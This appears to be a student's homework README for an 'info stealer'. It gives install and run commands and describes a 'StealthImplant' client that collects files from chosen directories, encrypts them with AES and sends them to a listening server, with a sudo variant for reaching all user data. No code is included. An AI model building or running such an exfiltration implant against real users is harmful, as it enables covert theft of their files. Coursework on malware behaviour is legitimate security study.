# Info stealer

# Installation

- first create the virtual environment. run `python3 -m venv venv`

- activate it. run `source venv/bin/activate`

- install the library you need. run `pip install pycryptodome`

# Example usage: 

## Client

- `python3 tmp363.py <server_ip> <server_port>`

If we want to access all user data, then we need to run

- `sudo env "PATH=$VIRTUAL_ENV/bin:$PATH" python3 tmp363.py localhost 8080`

## Server

- `python3 server363.py <ip> <port>`

note: server need to run first before client.

# Description

## Client

my tmp363 has a StealthImplant class which does what the hw doc ask us to do. First it walk through the `source` we initialize it with, to it will get all the files or files inside directory we want, to a list. Later, we have another function that will write the content of these value into the cache which will be encrypt later using AES and send to server.

## Server

It basically use socket to retrieve data from the client


